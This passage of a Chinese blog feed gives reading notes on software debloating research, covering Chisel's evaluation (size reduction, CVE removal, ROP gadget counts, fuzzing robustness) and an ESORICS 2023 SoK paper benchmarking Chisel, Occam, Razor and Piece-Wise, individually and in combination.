Benchmarks</strong><ul><li>使用GNU软件包中的10个基准程序来评估Chisel,</li><li>下表展示了这些程序的特征</li><li>且这些程序均为开源且广泛应用</li><li>每个都有一个或多个已知的安全漏洞CVE</li><li>并且有人工缩减的版本,可以在BusyBox中找到</li></ul></li><li><strong>规范</strong><ul><li>期望保留的功能参考了BusyBox的实现,我们假设BusyBox默认配置支持的选项是每个程序的核心功能</li><li>处于安全考虑,我们强制简化的程序在执行非核心功能程序时不产生任何未定义的行为(不仅是崩溃),例如缓冲区溢出或使用未初始化的变量</li><li>为此,我们使用Clang的sanitizer选项[4]编译程序在运行时监视未定义的行为</li><li>为了广泛的测试所有功能,我们从源代码仓库收集了测试用例</li><li>总的来说,Chisel生成的简化版本的程序满足以下限制<ul><li><ol><li>可以编译</li></ol></li><li><ol start="2"><li>与原始程序相比在核心功能上有着相同的输出</li></ol></li><li><ol start="3"><li>在执行非核心功能时不会产生未定义的行为</li></ol></li></ul></li><li>此外,为每次运行设置时间限制,防止由Chisel引入的无限循环的程序</li></ul></li><li><strong>基线化简器</strong>:C-REDUCE 和 PERSES</li></ul><h3 id="5.2-%E7%AE%80%E5%8C%96%E7%9A%84%E6%95%88%E7%8E%87" tabindex="-1">5.2 简化的效率</h3><ul><li><ol><li>简化大小</li></ol><ul><li>使用以下三种情况进行比较<ul><li>原始程序</li><li>基于静态分析 Sparrow [13] 删除未使用的代码: statements 从 172,304 到 55,848 (32.4%) (因为Unix实用程序有公共库)</li><li>Chisel:减少89.1%,只剩6111</li></ul></li></ul></li><li><ol start="2"><li>与现有方法比较运行时间</li></ol><ul><li>Chisel在12h内完成简化,因其不仅避免了语法错误,也学习去避免了语义错误</li><li>C-REDUCE超时6个,因其是基于行的简化器</li><li>PERSES超时2个,因其是一个纯粹的基于语法的简化器</li></ul></li><li><ol start="3"><li>与BusyBox中的人工简化版本比较</li></ol><ul><li>BusyBox为一个单一的可执行程序,通过子命令调用所有工具</li><li>BusyBox有7个程序比Chisel生成的程序更小,但这主要因为人工可以使用更优化的代码和数据结构,总的来说,Chisel生成的代码大小合理</li></ul></li><li><ol start="4"><li>Chisel比现有方法产生的程序更自然,使得人可以维护和扩展,同时保留了原始结构 和 软件工程实践(如模块化和局部化)</li></ol></li><li><ol start="5"><li>与Cov进行比较,证明Chisel的必要,覆盖率使用llvm-cov [11]计算,结果如下图示,结果显示Chisel可以比朴素的Cov方法显著的减少更多的代码<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(3)_7.png" alt></li></ol></li></ul><h3 id="5.3-%E5%AE%89%E5%85%A8%E5%A2%9E%E5%BC%BA" tabindex="-1">5.3 安全增强</h3><ol><li>首先检查简化后程序,查看Chisel是否已经去除已知的露铜</li><li>计算原始程序和简化程序的gadgets数量衡量攻击面的减少,这里使用ROP-gadget[12]工具</li><li>使用SOTA静态缓冲区溢出分析器Sparrow [13],检查所有报告的警报</li></ol><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(3)_8.png" alt></p><ul><li>结果展示如上图<ul><li><ol><li>Chisel 去除了10个程序中6个的CVEs</li></ol></li><li><ol start="2"><li>去除了潜在的攻击面,具体而言平均减少了 66.2%的ROP gadgets</li></ol></li><li><ol start="3"><li>减少了95.4%的缓冲区溢出警报,剩下的警报较少进行手动检查后确认是假警报</li></ol></li></ul></li></ul><h3 id="5.4-%E9%B2%81%E6%A3%92%E6%80%A7" tabindex="-1">5.4 鲁棒性</h3><ul><li>通过SOTA 模糊器 AFL,生成随机的命令行输入 和 必要的输入文件进行测试,实验进行了三天</li></ul><ol><li>大多数情况下,Chisel生成的程序在测试中表现良好,模型测试没有检测到崩溃.此外,由于有sanitizer的保护,Chisel生成程序时有效的过滤掉了错误的程序</li><li>然而在未见过的输入可能会出现错误.<ul><li>根据我们的经验,随机模糊测试可以丰富测试脚本生成更健壮的程序:将使得简化后程序崩溃的模糊测试生成样例加入到测试脚本中,并重新运行Chisel和模糊测试,程序健壮性进一步提升,接下来3天内模糊器没有发生崩溃</li></ul></li></ol><h2 id="6-%E5%AF%B9%E6%9C%89%E6%95%88%E6%80%A7%E7%9A%84%E5%A8%81%E8%83%81" tabindex="-1">6 对有效性的威胁</h2><ol><li>Chisel可能会因为<strong>测试脚本返回不确定</strong>的结果而出错.<ul><li>主要有未定义的行为引起,我们可以使用sanitizer来过滤这些有问题的程序,但如果目标程序使用了未受相同保护方案编译外部库,则无法过滤. 如果外部库是开源的话可以通过再编译进行解决</li><li>另一个原因是我们避免了 不能终止的程序 产生,因为简化可能导致不能终止(如去除了循环语句的终止条件),为此我们设置了时间限制. 然而如果限制不够大,测试脚本可能返回不能确定的结果.这个问题可以通过动态监测和躲避无限循环解决</li></ul></li><li><strong>测试用例不够完备</strong><ul><li>我们使用AFL模糊测试工具对生成的程序进行了鲁棒性测试。然而，如果输入需要符合特定的格式，我们的测试可能不够全面，因为我们无法向AFL提供特定的语法，使其能够通过过滤不合法的测试输入来剪枝搜索空间。</li><li>为了解决这个问题，我们可以使用基于语法的模糊测试工具[25, 44]。</li></ul></li><li><strong>静态分析的不确定性</strong><ul><li>我们使用Sparrow静态分析器与AFL一起测试鲁棒性。尽管该分析器对于大多数C程序功能是准确的，但如果目标程序具有复杂的指针算术操作或由未知语义的API函数引起的复杂控制流程，则可能会存在不确定性。</li><li>在实践中，由于设计一个完全准确的静态分析器极其具有挑战性，因此会使用对于不同语言功能而言是准确的各种静态分析工具[31]。在此方面，我们可以通过结合多个具有不同功能的静态分析器的结果来缓解这个问题。</li></ul></li></ol><h2 id="7-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">7 相关工作</h2><ul><li><strong>程序Debloating</strong>:现在有很多在不同粒度缓解软件膨胀的技术<ul><li>coarse-grained(大粒度级,如应用级)<ul><li>例子:Rastogi et al. [35] 容器级别 Docker. 可以根据用户的限制将一个复杂容器分成多个简单的小容器,其方法基于动态分析获取应用的信息</li></ul></li><li>finer-grained(小粒度级)<ul><li>JRed [28] 和 RedDroid [27] 去除了Java和Android应用中的未使用的类和方法</li><li>Quach et al. [34] 提出了一个简化系统 ,在编译和加载中去除不必要的代码,其系统通过静态分析和基于训练的技术计算函数依赖来简化应用和库</li></ul></li><li>与之前方法比较,Chisel可以再更细的粒度进行简化,如语句级别. 现有的小粒度的方法基于静态分析只能去除不用的代码,而Chisel很激进甚至可以出去在运行路径上的代码</li><li><strong>程序膨胀检查</strong><ul><li>Bhattacharya等人[19]介绍了一种分析技术，用于检测Java应用程序中可能的膨胀源;我们的方法自动删除相对于属性测试程序的冗余代码</li></ul></li><li><strong>监测和减少运行时内存膨胀</strong><ul><li>这与程序debloating正交但互补,因为程序debloating可能潜在缓解这一问题通过移除运行路径上的代码</li></ul></li></ul></li><li><strong>测试输入最小化</strong><ul><li>目前很多简化程序的方法都是 最小化使得编译器或解释器不会崩溃的程序,由于其不关注简化后的代码是否可以运行或维护,最后产生的代码安全性和可读性都很差. 例如C-REDUCE不能维护程序的软件工程时间,而我们的目标是开发人员可以后续使用的精简程序</li><li>现有的方法仅通过简单的指导来搜寻最小的程序.最近出现了能够识别程序<em>语法结构</em>的方法,这种先验知识可以避免很多语法错误的程序的尝试,但不能从<em>语义</em>上避免错误.我们的系统通过构建静态模型避免了语义上错误的尝试. 同时,我们的方法可以加速现有的所有方法,包括又非结构化输入的增量调试法</li></ul></li><li><strong>程序切片和可达性分析</strong><ul><li>切片是从程序中提取的与某个感兴趣点的值相关的子部分,通常由静态分析和动态分析得出. 我们的方法旨在更一般的属性并且不需要特定的语义和依赖分析,且我们的方法可以获得比程序切片更小的程序</li><li>在我们的实验中，我们与可达性分析相比较，而不是使用切片技术，原因如下。<ul><li>动态切片包含了在程序的特定执行下影响目标变量值的所有语句。然而，从高级规范中确定感兴趣的变量和程序点可能是具有挑战性的。即使用户手动注释这些目标，动态切片对于程序精简可能仍然效果不佳。例如，“safer_name_suffix” 的输出实际上取决于函数中的大部分语句。因此，与 Chisel（相比，动态切片无法消除漏洞。</li></ul></li><li>静态可达性计算通常会因为静态分析的不可判定性而产生对实际可达代码的不精确近似。<ul><li>通常无法有效处理复杂的控制流，例如间接过程调用（如 setjmp / longjmp，函数指针或反射）、复杂的条件语句和指针算术。</li><li>而我们的方法不受这些问题的限制。动态可达性计算在代码大小方面可能比静态方法更有效。然而，我们的研究表明，我们的方法产生的程序比基于动态可达性的程序具有更小的攻击面</li></ul></li></ul></li></ul><h2 id="8-%E7%BB%93%E8%AE%BA" tabindex="-1">8 结论</h2><ul><li><p>我们提出了Chisel, 一种基于 增量调试法的学习系统,用于程序debloating</p><ul><li>我们的方法通过给定的测试脚本高效地简化程序</li><li>学习到的概率模型加速找到最小程序的速度</li><li>此外这种精简方法除去了一些漏洞,并显著减少了潜在的攻击面</li><li>此外,简化获得的 程序大小和复杂度 运行更进一步应用精确的推理方法和人工检查</li></ul></li><li><p>在未来,计划在以下方向扩展Chisel</p><ul><li><ol><li>探索更好的概率模型和高效的增量学习方法</li></ol></li><li><ol start="2"><li>设计除 IO 之外的其它规范</li></ol></li><li><ol start="3"><li>应用于简化二进制等其它语言的方法</li></ol></li></ul></li></ul><h2 id="9-%E9%98%85%E8%AF%BB%E6%80%BB%E7%BB%93" tabindex="-1">9 阅读总结</h2><ul><li>Chisel:使用强化学习框架辅助增量调试法来进行程序去膨胀</li><li>问题:<ul><li><ol><li>需要用户提供属性测试函数,很麻烦的</li></ol></li><li><ol start="2"><li>增量调试法很慢的,套上强化学习更慢了</li></ol></li><li><ol start="3"><li>删除的代码取决于输入,并且只会删除代码,因为使用的是增量调试法</li></ol></li></ul></li></ul><h2 id="10-%E5%A4%8D%E7%8E%B0" tabindex="-1">10 复现</h2><ul><li><p>在win11上使用ubuntu20.04虚拟机</p><ul><li>直接下载源码,编译运行,运行失败,应该是新版被不兼容旧版本的问题</li><li>于是在虚拟机上使用docker,在docker上跑chisel,最小的gzip跑了14h(</li></ul></li><li><p>结论:很慢的,之后也不用跑了,感受下效果练练手就行了</p></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (2)</title>
      <link href="/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(2)/"/>
      <url>/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(2)/</url>
      
        <content type="html"><![CDATA[<h2 id="2.-sok%3A-a-tale-of-reduction%2C-security%2C-and-correctness---evaluating-program-debloating-paradigms-and-their-compositions" tabindex="-1">2. SoK: A Tale of Reduction, Security, and Correctness - Evaluating Program Debloating Paradigms and Their Compositions</h2><p>ESORICS 2023 - 28th European Symposium on Research in Computer Security, Lecture Notes in Computer Science, Springer, 2023.(CCF B)</p><p>Ali M, Muzammil M, Karim F, et al. SoK: A Tale of Reduction, Security, and Correctness-Evaluating Program Debloating Paradigms and Their Compositions[J]. Computer Security–ESORICS 2023, 2023.</p><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li>本文提出 DebloatBencha,一个可以 扩展的,可持续的 基准平台,可以比较方法间的不同</li><li>然后,对现阶段的技术进行了一个全面的比较</li><li>我们整合了4种不同的方法进行比较,揭漏了其中的一些隐秘<ul><li>基于源程序的</li><li>基于编译器的中间表示</li><li>基于运行时的二进制代码</li><li>基于外部库的</li></ul></li><li>同时我们也将一些方法进行了结合,发现了一些方法组合起来的效果((e.g., Chisel-Occam, Chisel-Occam-Razor)优于单独实用的效果</li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li><p>当前去膨胀方法遇到的挑战:不能合适地去评估正确性和表现,首要的原因是缺乏一个基准平台,由此简历多样化的分析工具的路径变得不清晰且代价高昂</p></li><li><p><strong>评估平台</strong>:设计DEBLOATBENCHA基准框架,来评估目标程序是C/C++ 的去膨胀方法,因为C/C++ 使用范围广且攻击面多</p><ul><li>当前平台集成了一组软件去膨胀研究,代表了四种类别:Chisel(源代码),Occam（编译器中间表示）,Razor（可执行二进制文件）和Piece-wise（外部库）</li><li>当前目标程序套件包括10个来自ChiselBencha的实用程序,3个基于GUI(graphical user interface)的程序和2个面向网络的程序</li><li>该平台提供易于使用的命令行接口来运行不同的去膨胀工具</li><li>同时平台设计有可定制性和可扩展性</li></ul></li><li><p><strong>评估去膨胀方法</strong>:对 继承在评估平台的4种方法进行了全面的研究,具体而言,检查了由去膨胀方法生成的二进制文件的正确性,内存使用量,磁盘大小,安全相关的代码片段,运行时间的变化,我们发现</p><ul><li>基于静态分析的方法(Occam,PECEC-WISE)通过了所有测试</li><li>使用动态分析的方法(Chisel,Razor)的二进制文件随着去膨胀程度的增加失败的测试越多</li><li>CHisel对非核心工具程序无法产生二进制文件,RAZOR也在3个非核心工具程序无法产生二进制文件,这表明测试驱动的去膨胀器在处理GUI和网络编程的程序中存在限制</li><li>此外,四个工具中有三个运行很快,可以集成到软件阶段工作流中,我们创建了首种将多个工具组合来应用到单个二进制文件的方法,根据我们实验证明,这种组合可在某些方面达到很好的效果</li></ul></li><li><p>在平台的开发和方法评估中,我们同时也修复报告了一些bug,并提出了一些改进方法</p></li><li><p>我们的贡献总结</p><ul><li><ol><li>开发了一种易于扩展的框架 DebloatBenchA ,来评估去膨胀算法.为 目标程序套件(10个来自ChiselBencha的实用程序,3个基于GUI(graphical user interface)的程序和2个面向网络的程序) 创建了82个变体来进行鲁棒性测试. 在该框架中集成了4种不同类型的方法,目前正在开源中</li></ol></li><li><ol start="2"><li>对4种方法进行了全面的评估,发现了一些隐秘,并提出了一些改进方法</li></ol></li><li><ol start="3"><li>利用多个去膨胀方法的优势,提出了一种组合分析方法,经过评估显示优于单个方法</li></ol></li></ul></li></ul><h3 id="2-%E5%8E%BB%E8%86%A8%E8%83%80%E7%AE%97%E6%B3%95" tabindex="-1">2 去膨胀算法</h3><ul><li>DebloatBencha支持应用级和库级别的去膨胀,因为评估内核级的去膨胀需要与  应用级和库级别 不同的机制,故暂不考虑.下表总结了各种应用程序和库级别的程序去膨胀方法<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_1.png" alt></li></ul><h4 id="2.1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8E%BB%E8%86%A8%E8%83%80" tabindex="-1">2.1 应用程序级别的去膨胀</h4><ul><li>应用程序级的去膨胀器可以分为三类<ul><li>源代码级:包括Chisel,C-Reduce,Perses,大部分源代码级的方法使用delta调试算法的变体进行去膨胀.delta调试算法(Delta-debugging)使用一个测试集来涵盖去膨胀后程序拥有行为,但会导致过拟合.<ul><li>根据辛等人论文所说,Chisel在简化程度上表现最佳,因此,我们选择了Chisel作为源代码级的去膨胀器代表</li></ul></li><li>中间代码级:该级别工具的操作作用在LLVM位码上,使用部分求值法对代码进行缩减.<ul><li>例子:OCCAM算法,该算法结合部分求值和类型理论来移除不必要的代码,支持多趟跨模型分析</li><li>由于OCCAM是唯一开源的支持自动化分析的工具,所以我们选择其为中间代码级别的代表</li></ul></li><li>二进制代码级:该级别方法依赖于执行跟踪,由选择的测试用例(RAZOR)或模糊测试(Ancile)触发<ul><li>例子:Razor运行二进制代码在测试用例上,然后使用 Tracer来收集运行踪迹,然后解码踪迹,用执行过的指令来构建程序的CFG(Control Flow Graph 控制流图),Ancile还需要一组测试用例来作为模糊器的种子</li><li>因为Razor是开源的,所以我们选择其为二进制代码级的代表</li></ul></li></ul></li></ul><h4 id="2.2-%E5%BA%93%E7%BA%A7%E5%88%AB%E7%9A%84%E5%8E%BB%E8%86%A8%E8%83%80" tabindex="-1">2.2 库级别的去膨胀</h4><ul><li>库级别的去膨胀器可以分为三种:<ul><li>(1) 静态时:给定一组应用,静态去膨胀器会静态的环境下对动态链接库进行去膨胀,从而永久替代原始的库集合(e.g. Nibbler)</li><li>(2) 加载时:在将目标库加载到内存时对函数进行去膨胀(RIECE-WISE)</li><li>(3) 运行时:仅在运行时加载需要的函数(BlankIt)</li></ul></li><li>由于PIECE_WISE是开源的,所以我们选择其为库级别的代表</li></ul><h3 id="3-debloatbencha%E6%A1%86%E6%9E%B6%E7%9A%84%E7%BB%84%E6%88%90" tabindex="-1">3 DebloatBencha框架的组成</h3><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_2.png" alt></p><ul><li><p>框架架构如上图.</p><ul><li>设计遵循了 开闭原则(Open-Close Principle),即对扩展开放,对修改关闭,以确保更好的可扩展性和可维护性</li><li>基于容器的方式来构建建构以隔离不同方法使用的环境,并为每个方法构建相应容器</li><li>使用基于命令行工具的管理系统(称为编排器)来构建和管理这些容器的生命周期</li><li>框架中的每个输入程序都有一个相关的配置文件描述其各种元数据(例如 测试样例位置,构建信息)</li><li>由于不同的程序使用不同的专有程序输入,为每个容器提供一个适配器将程序输入转换为框架自己的格式</li></ul></li><li><p>框架组成,主要有三部分:(1)输入程序(2)去膨胀工具(3)编排器和测量脚本.</p><ul><li>输入程序,编排器和测量脚本位于主机种,去膨胀工具和适配器位于容器中</li></ul></li></ul><h4 id="%E5%8E%BB%E8%86%A8%E8%83%80%E5%B7%A5%E5%85%B7" tabindex="-1">去膨胀工具</h4><ul><li>在框架中的每个去膨胀工具通过容器创建</li><li>框架使用一个配置文件收集与一个程序相关的输入</li><li>同时创建了一个脚本来解析配置文件并且为每个工具生成各自的输出,该脚本称为 适配器脚本,该脚本将工具和框架链接起来</li></ul><h4 id="%E7%9B%AE%E6%A0%87%E7%A8%8B%E5%BA%8F%E5%A5%97%E4%BB%B6" tabindex="-1">目标程序套件</h4><ul><li>从ChiselBencha中选择了10个实用程序,为了评估通用性,选择3个GUI程序和2个网络程序,作为目标程序套件</li><li>为了捕捉多样性,我们为每个应用选择多样性的部署上下文. 我们将一个目标程序和其特定的部署上下文称为一个变体</li><li>下表总结了完成工作负载的82个变体<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_3.png" alt></li></ul><h4 id="%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B" tabindex="-1">测试用例</h4><ul><li>测试用例的数量影响基于测试用例去膨胀工具的训练时间,因此选择高质量的测试用例来最大化覆盖同时不影响性能很重要.</li><li>给定一个应用的运行配置,生成其高质量的测试用例是一个活跃的研究领域.但这个问题是一个正交问题(指与当前讨论的问题或主题无关的问题),这种自动化超出了本文的范围,因此我们使用人工创造的测试用例.</li><li>在准备这些测试用例时,我们的目标是捕捉多样化行为来最大化覆盖范围</li></ul><h4 id="%E6%B5%8B%E9%87%8F%E8%84%9A%E6%9C%AC" tabindex="-1">测量脚本</h4><ul><li>通过以下五个指标衡量 (?哪有五个)<ul><li><ol><li>去膨胀后二进制文件的正确性</li></ol></li><li><ol start="2"><li>二进制文件大小的减少</li></ol></li><li><ol start="3"><li>从 gadgets 减少的角度进行安全性分析</li></ol></li><li><ol start="4"><li>去膨胀时间</li></ol></li></ul></li><li>没有使用 CVE 进行安全评估，主要是因为与功能相关。消除它们更可能受到功能选择的影响，而不是工具本身。</li></ul><h4 id="%E5%86%85%E5%AD%98gadget%E8%AE%A1%E6%95%B0" tabindex="-1">内存gadget计数</h4><ul><li>PIECE-WISE 在 外部库 加载进入内存时 以 函数为单位 对其进行简化,然后我们使用gdb来寻找在内存中简化版本库中缺失的函数.在收集到信息后,我们通过用NOPS替换确实的函数体来创建一个新版本的库.最后我们使用个版本的库使用ROPgadget工具来收集ROP gadgets</li></ul><h3 id="4-debloatbencha-%E7%9A%84%E5%AE%9E%E9%AA%8C%E9%85%8D%E7%BD%AE" tabindex="-1">4 DebloatBenchA 的实验配置</h3><ul><li>集成4种去膨胀工具</li><li>我们进行了两组实验，以测量独立工具和它们的组合的性能。</li><li>最后，我们讨论了用于比较性能的指标。</li></ul><h4 id="4.1-%E7%8B%AC%E7%AB%8B%E6%A8%A1%E5%BC%8F" tabindex="-1">4.1 独立模式</h4><ul><li>CHISEL配置:从Chisel的作者那里，我们了解到CIL [34]用于合并较早版本的Chisel中输入程序的C文件。为了成功运行Chisel，我们重新使用了来自ChiselBench的10个coreutils程序的合并C文件。对于其他5个大型程序，我们利用了其构建系统集成功能。</li><li>OCCAM配置:OCCAM支持很多策略来简化二进制文件,每个策略都会产生不同的简化程度,从激进到没有特征化.运行一个有效性检查的试验来找到最佳配置,我们选择 the onlyonce(最佳配置) 来衡量比较OCCAM性能</li><li>RAZOR配置:RAZOR的性能取决于Pathfinder模块所使用的启发式方法的选择.由于RAZOR运行的比其它程序块,我们为每种启发式方法创建了多个版本的二进制文件,从中选择正确率最高的版本进行性能分析和与其它工具的比较</li><li>PIECE-WISE配置:首先使用了Docker容器提供的预构建编译器和加载器.我们使用 musl-libc v1.1.15 作为我们程序套件中每个输入程序的依赖库.然后,我们使用 PIECE-WISE 的对依赖库进行简化. 为了对比,我们要创建非PIECE-WISE编译的二进制文件,我们使用PIECE-WISE仓库提供的同样的Docker容器,同时下载未经修改的LLVM和Clang以及musl-libc,并与之前PIECE-WISE使用的版本相同</li></ul><h4 id="4.2-%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F" tabindex="-1">4.2 组合模式</h4><ul><li>因为不同方法在不同程序代码级别运行,所以可以将多种方法运用到同一个程序上,例如CHISEL在源代码级别进行简化,然后产生的二进制用RAZOR进行进一步简化,依据这一思想,我们构思了4种工具的组合来对框架的输入程序组进行简化<ul><li><ol><li>Chisel-Occam</li></ol></li><li><ol start="2"><li>Chisel-Occam-Razor</li></ol></li><li><ol start="3"><li>Chisel-Razor</li></ol></li><li><ol start="4"><li>Occam-Razor</li></ol></li></ul></li><li>因为PIECE-WISE需要同时在源代码和二进制上进行简化,所以其只能与CHISEL进行组合,我们尝试了其组合,但效果有限</li><li>对于给定的指标,我们将 组合方法的性能 和 单个工具的最优情况 进行比较</li></ul><h3 id="5-%E5%8E%BB%E8%86%A8%E8%83%80%E5%99%A8%E7%9A%84%E8%AF%84%E4%BC%B0" tabindex="-1">5 去膨胀器的评估</h3><ul><li>研究问题<ul><li>RQ1:去膨胀方法是否会对目标应用程序的正确性产生负面影响？</li><li>RQ2:在简化单个程序大小规模时各方法的效果如何?</li><li>RQ3:简化程序对程序 gadget相关安全性有何影响?</li><li>RQ4:实际中,各简化程序的使用性如何</li><li>RQ5:组合多个 去膨胀方法是否有进一步的提升</li></ul></li></ul><h4 id="5.1-%E5%9C%A810%E4%B8%AA-utilcore%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%9A%84%E8%AF%84%E4%BC%B0" tabindex="-1">5.1 在10个 utilcore程序上的评估</h4><ul><li><p><strong>RQ1:工具正确性</strong>:首先使用测试用例评估 去膨胀器的正确性,总是会高估正确性,因为测试用例可能无法覆盖全部情况</p><ul><li><ol><li>下图表示了各方法的正确度 <img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_4.png" alt></li></ol><ul><li>基于静态分析的方法,OCCAM和PIECE-WISE通过了全部测试用例</li><li>基于动态分析的方法,CHISEL和RAZOR通过了大部分测试用例</li><li>OCCAM的正确性最好因为他的静态部分求职方法保守地保留了给定参数地所有功能.CHISEL表现不好因为其过度依赖于给定的测试脚本</li></ul></li><li><ol start="2"><li>下图表示了方法随训练数据的变化正确度的变化:可以看出随着训练数据的增多,正确性在增加<img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_5.png" alt></li></ol></li></ul></li><li><p><strong>RQ2:大小简化程度</strong>:去膨胀一个目标应用程序就是通过在一个特定地部署环境下删除不用的代码来减小其大小,其效果体现在磁盘中二进制文件的大小,各方法表现如下图所示(图中减少百分比为正表示二进制文件变小程度)</p><ul><li><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_6.png" alt></li><li>CHISEL在源代码中简化,可以减少二进制代码大小,增加训练量有时会增加代码大小</li><li>OCCAM在中间代码中简化,可以减少二进制代码大小,由于OCCAM的部分求值方法可能会增加函数的数量,有时会增加代码大小</li><li>RAZOR保留原始二进制代码并使用转换后的代码扩充它</li><li>PIECE-WISE将表示程序控制流图的元数据添加到二进制文件中</li></ul></li><li><p><strong>RQ3:Gadget 的表现</strong>: 原始ROP gadget数量和代码大小并不是评估二进制文件漏洞的可靠指标.[14, 15]。Homescu等人[24]认为，gadget可以根据提供的功能类型进行分类，每个类别只需要一个成员即可用于特定类别的攻击。他们构造了“micro-gadgets”类别（限制为最大长度为3字节），这些gadget提供了每个类别的基础。我们报告了去bloating对ASLR-proof和Turing-complete表达能力的两个类别中的变化的影响。如下图示</p><ul><li><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_7.png" alt></li><li>在两种类别中,CHISEL有着最高的减少程度</li><li>在Turing-complete中,OCCAM比RAZOR有效,而在ASLR-proof中,RAZOR比OCCAM有效</li><li>而PIECE-WISE在这两个类别中几乎没有减少gadget</li></ul></li><li><p><strong>RQ4:工具实用性</strong>:为了了解每种去膨胀工具潜在部署环境,我们测量了其在框架工作负载上所有变体上运行的时间,如下图示</p><ul><li><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_8.png" alt></li><li>CHISEL使用13000s,是其它方法的三个数量级,因为其依靠马尔可夫决策过程来找到满足所提供测试用例的最小语句子集。</li><li>PIECE-WISE,OCCAM,RAZOR分别为22.1,4.9,5.2 s,因为其主要依靠静态分析,因此这三种方法更容易应用到传统的优化流程种</li></ul></li><li><p><strong>总结</strong></p><ul><li><strong>正确性</strong>:Chisel: 80.4%, Occam: 100%, Razor: 94.8%, Piece-Wise:100%. 基于静态分析的比基于动态分析的效果好</li><li><strong>磁盘上大小</strong>:CHISEL和OCCAM 减小大小,而RAZOR和PIECE_WISE因为扩充了原始二进制大小,造成二进制大小变大</li><li><strong>Gadat表现</strong>:CHISEL表现比其它方法都好</li><li><strong>去膨胀时间</strong>:CHISEL比其它方法时间长很多(3.75h),PIECE-WISE,OCCAM,RAZOR分别为22.1,4.9,5.2 s</li></ul></li></ul><h4 id="5.2-%E5%9C%A85%E4%B8%AA%E9%9D%9Eutilcore%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%9A%84%E8%AF%84%E4%BC%B0" tabindex="-1">5.2 在5个非utilcore程序上的评估</h4><ul><li><strong>RQ1:正确性</strong>:<ul><li>使用247个测试用例,来自5个非utilcore程序的22个变体.</li><li>在容器种对目标程序进行去膨胀</li><li>在主机系统中进行正确性测试(因为GUI不好在容器中)</li><li>评估显示<ul><li>只有OCCAM和PIECE-WISE产生了正确的二进制文件可以通过所有的测试用例</li><li>RAZOR可以产生vlc和ngnix的正确二进制文件,而其它不行</li><li>CHISEL一个都不能正确产生</li></ul></li></ul></li><li><strong>RQ2:简化性</strong>:一定程度上都增大了二进制文件的大小</li><li>RQ1和RQ2的表现如下图示 <img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_9.png" alt></li><li><strong>RQ3:Gadget 的表现</strong><ul><li>PIECE-WISE的最大平均时间是129.67s(在Graphicsmagick上),最小是13.66s(在Gvpdf上)</li><li>OCCAM平均最大时间是95.6s(在Graphicsmagick上),最小是1.3s(在Vlc上)</li><li>RAZOR最大平均时间120s</li></ul></li><li><strong>RQ4:工具实用性</strong>:只有OCCAM将两种类别的gadget都移除了,RAZOR还增加了Turing-complete类别的gadget,如下图示<ul><li><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_10.png" alt></li></ul></li></ul><h4 id="5.3-%E5%8E%BB%E8%86%A8%E8%83%80%E5%99%A8%E7%BB%84%E5%90%88" tabindex="-1">5.3 去膨胀器组合</h4><ul><li><p>为了更有意义的比较,尽在utilcore程序上进行比较(以为有的方法不能再非utilcore上运行)</p></li><li><p>将四种方法的组合取首字母组合进行表示,如COR表示CHISEL-OCCAM-RAZOR组合运行,组合运行时需要保证最后的二进制程序能够运行</p></li><li><p>组合后正确性和简化性如下图示</p><ul><li><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_11.png" alt></li><li><strong>正确性</strong>:由于CHISEL在单独测试中未通过测试用例的几率大,这些未通过的测试用例在组合测试中被去除,同时由于OCCAM通过了所有测试用例,因此作为基线</li><li><strong>简化度</strong>:<ul><li>单个工具的最大简化度是CHISEL减少了70.4%,而CO组合的简化度是 74.6%,COR为67.5%</li></ul></li><li><strong>Gadget表现</strong>:<ul><li><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_2_12.png" alt></li><li>在Turing-complete ROP中 单个工具的最好情况是CHISEL,减少了36.6%,然而COR达到了38.8%,CO更是达到了50.5%</li><li>在ASLR-proof 